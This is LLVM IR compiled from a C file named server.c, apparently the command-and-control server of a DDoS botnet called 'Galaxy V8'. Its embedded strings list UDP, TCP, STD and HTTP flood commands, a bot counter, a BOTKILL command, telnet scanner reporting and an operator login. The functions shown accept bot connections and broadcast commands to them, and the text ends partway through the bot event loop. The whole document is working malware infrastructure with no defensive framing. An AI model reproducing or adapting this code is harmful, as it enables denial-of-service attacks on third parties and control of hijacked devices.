; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [100 x i8], [100 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;35m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"!* BOTKILL\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.9 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.10 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.11 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.16 = private unnamed_addr constant [29 x i8] c"%c]0; Planets  %d  |  %s  %c\00", align 1
@accounts = internal global [100 x %struct.login_info] zeroinitializer, align 16
@OperatorsConnected = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.19 = private unnamed_addr constant [21 x i8] c"\1B[36mUsername\1B[97m: \00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.21 = private unnamed_addr constant [21 x i8] c"\1B[36mPassword\1B[97m: \00", align 1
@.str.22 = private unnamed_addr constant [112 x i8] c"\1B[96mPlease wait \1B[32m%s \1B[96mwe are verifying if your planet is part of \1B[35;1mThe Galaxy \1B[32m[\1B[91m|\1B[32m]\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [112 x i8] c"\1B[96mPlease wait \1B[32m%s \1B[96mwe are verifying if your planet is part of \1B[35;1mThe Galaxy \1B[32m[\1B[91m/\1B[32m]\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [112 x i8] c"\1B[96mPlease wait \1B[32m%s \1B[96mwe are verifying if your planet is part of \1B[35;1mThe Galaxy \1B[32m[\1B[91m-\1B[32m]\0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [106 x i8] c"\1B[35m      \1B[36m  .d8888b. \1B[35m          888       \1B[32mo\1B[35m                     \1B[32m   .-o--.     \0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [111 x i8] c"\1B[35m  \1B[32m0    \1B[36md88P  Y88b\1B[35m          888             \1B[32mO\1B[35m               \1B[32m  :O o O :    \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [96 x i8] c"\1B[35m      \1B[36m 888    888\1B[35m          888                             \1B[32m  : O. Oo;    \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [96 x i8] c"\1B[35m      \1B[36m 888       \1B[35m  8888b.  888  8888b.  888  888 888  888 \1B[32m    `-.O-'     \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m 888  88888\1B[35m     *88b 888     *88b `Y8bd8P' 888  888 \1B[32m              \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m 888    888\1B[35m .d888888 888 .d888888   X88K   888  888 \1B[32m              \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m Y88b  d88P\1B[35m 888  888 888 888  888 .d8**8b. Y88b 888 \1B[32m              \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m  *Y8888P88\1B[35m *Y888888 888 *Y888888 888  888  *Y88888 \1B[32m              \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [105 x i8] c"\1B[35m      \1B[36m           \1B[35m                        \1B[32m.\1B[35m            888 \1B[32m              \0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [105 x i8] c"\1B[35m      \1B[36m    \1B[32mo\1B[35m       \1B[35m                               Y8b d88P \1B[32m              \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m           \1B[35m                                 *Y88P*  \1B[32m              \0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [63 x i8] c"\1B[35m     Galaxy V8 - \1B[0;32mAll the other versions are shit\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c" \0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [40 x i8] c"\1B[32m%s\1B[36m@\1B[35mTheGalaxy\1B[94m>\1B[37m \00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.40 = private unnamed_addr constant [31 x i8] c"\1B[35mPlanets:        \1B[32m%d\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [26 x i8] c"\1B[35mMasters:   \1B[32m%d\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.43 = private unnamed_addr constant [42 x i8] c"\1B[37m[---\1B[31mList of Commands\1B[37m---]\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [58 x i8] c"\1B[32mSTOP         \1B[37m| \1B[36mKills All Current Attacks\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [59 x i8] c"\1B[32mBOTS         \1B[37m| \1B[36mShows The Current Botcount\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [64 x i8] c"\1B[32mATTACK       \1B[37m| \1B[36mDisplays Help For DDoS Commands\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [50 x i8] c"\1B[32mCLEAR        \1B[37m| \1B[36mClears You Screen\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [7 x i8] c"ATTACK\00", align 1
@.str.49 = private unnamed_addr constant [43 x i8] c"\1B[37m[----\1B[31mAttack Commands\1B[37m----]\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [89 x i8] c"\1B[32m!* UDP \1B[35mIP PORT TIME 32 0 10                 \1B[37m|\1B[36m Launches A UDP Flood\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [89 x i8] c"\1B[32m!* TCP \1B[35mIP PORT TIME 32 FLAGS 0 10           \1B[37m|\1B[36m Launches A TCP Flood\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [89 x i8] c"\1B[32m!* STD \1B[35mIP PORT TIME                         \1B[37m|\1B[36m Launches A STD Flood\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"\1B[32m!* HTTP \1B[35mGET-HEAD-POST IP 80 / TIME POWER    \1B[37m|\1B[36m Launches A HTTP Flood\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.55 = private unnamed_addr constant [53 x i8] c"\1B[96m[ATTACKS] \1B[37mAttempting To Stop All Attacks\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"output.\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.58 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.60 = private unnamed_addr constant [42 x i8] c"\1B[96m[LOGOUT] \1B[37m%s Has Been Logged Out\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.62 = private unnamed_addr constant [12 x i8] c"history.log\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.64 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.65 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.66 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.67 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.68 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.69 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.70 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.71 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.72 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.73 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.74 = private unnamed_addr constant [5 x i8] c"ZERO\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.76 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.77 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.78 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %78, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %81

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %49, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42, %38
  br label %78

50:                                               ; preds = %42
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %70

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %70

60:                                               ; preds = %53
  %61 = load i32, i32* %12, align 4
  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 9, i32 16384)
  %63 = load i32, i32* %12, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #8
  %67 = call i64 @send(i32 %63, i8* %64, i64 %66, i32 16384)
  %68 = load i32, i32* %12, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %70

70:                                               ; preds = %60, %53, %50
  %71 = load i32, i32* %12, align 4
  %72 = load i8*, i8** %4, align 8
  %73 = load i8*, i8** %4, align 8
  %74 = call i64 @strlen(i8* %73) #8
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i64 1, i32 16384)
  br label %78

78:                                               ; preds = %70, %49
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %35, !llvm.loop !11

81:                                               ; preds = %35
  %82 = load i8*, i8** %8, align 8
  call void @free(i8* %82) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %295
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %292, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %295

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 1
  store i8 0, i8* %68, align 4
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %292

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %184

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %154, %178
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %183

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %183

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 1
  %120 = load i8, i8* %119, align 4
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
